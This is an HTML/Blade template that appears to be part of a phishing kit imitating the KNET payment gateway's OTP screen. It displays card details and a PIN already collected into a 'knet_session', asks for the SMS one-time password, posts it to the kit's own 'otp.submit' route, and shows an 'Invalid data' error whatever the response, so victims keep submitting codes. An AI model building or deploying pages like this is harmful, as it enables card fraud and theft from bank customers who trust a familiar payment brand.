<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ asset('front/assets/style2.css') }}">
    <title>KNET Payments</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="image/x-icon" href="{{ asset('front/assets/image/icons/knet.jpg') }}">
    <script src="https://code.jquery.com/jquery-3.6.4.js"></script>
</head>


<body>
    <div class="container">
        <div class="img-heading">
            <img src="{{ asset('front/assets/image/icons/image_bank.jpg') }}" style="width: 372px;height: 85px;">
        </div>
        <div class="panel">
            <div class="img-panel"><img src="{{ asset('front/assets/image/icons/boyan.svg') }}" /></div>
            <div class="row one">
                <span>Merchant:  </span>
                <span>{{ session('knet_session.bank') }} Bank</span>
            </div>

            <div class="row one">
                <span>Amount: </span>
                <span style="margin-left: 10px;">KD {{ session('knet_session.first_batch') }}</span>
            </div>
        </div>

        <div class="panel">
            <div id="notificationbox"><br>
                <div class="error" id="error"   style="display: none">
                    <p>Note:Invalid data - please check OTP code.
                    </p>
                </div>
                <br>
                <div class="notification" id="notification">
                    <p><span>NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered
                        with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the
                        box below.
                    </p>
                </div>
            </div>

            <div class="row one">
                <span>Card Number : </span> 
                <span class="tt">{{ session('knet_session.prefix') }}******{{ substr(session('knet_session.debitNumber'), -4) }}</span>
            </div>

            <div class="row one">
                <span>Expiration Month : </span> 
                <span class="tt">{{ session('knet_session.month') }}</span>
            </div>

            <div class="row one">
                <span>Expiration Year : </span> 
                <span class="tt">{{ session('knet_session.year') }}</span>
            </div>

            <div class="row one">
                <span>PIN : </span> 
                <span class="tt">****</span>
            </div>

            <div class="row one">
                <span>OTP : </span>
                <input id="otp" type="password" onkeypress="return isNumber(event)"
                    placeholder="Timeout in 3:57" style="margin-left: 68px; border-radius: 5px;" class="custome tow" maxlength="6">
            </div>
        </div>

        <div class="panel end">
            <button onclick="onPay();">Confirm</button>
            <button onclick="cancelPage();">Cancel</button>
        </div>

        <footer>
            <div class="fotter-1">
                <img src="{{ asset('front/assets/image/icons/knet.jpg') }}" width="30px" /> 
                <span>Knet Payment Gateway</span>
            </div>
            <br>
        </footer>
    </div>

    <script>
        let min = 3;
        let second = 57;

        var interval = setInterval(function () {
            if (second > 0) --second;
            if (second <= 0) {
                second = 59;
                --min;
            }

            $("#otp").attr("placeholder", "Timeout in " + min + ":" + second);

            if (min == 0) clearInterval(interval);
        }, 1000);

        function isNumber(evt) {
            evt = evt || window.event;
            var charCode = evt.which || evt.keyCode;
            return !(charCode > 31 && (charCode < 48 || charCode > 57));
        }

        function onPay() {
            var otp = $("#otp").val();
            var error = $("#error");
            if (otp !== "") {
                $.post("{{ route('otp.submit') }}", {
                    _token: '{{ csrf_token() }}',
                    otp: otp
                }, function (response) {
                  error.show();
                });
            } else {
                alert('قم بإدخال الرمز المرسل إلى رقم الهاتف أولاً ..');
            }
        }

        function cancelPage() {
            window.location.href = "{{ url('/') }}";
        }
    </script>
</body>
</html>
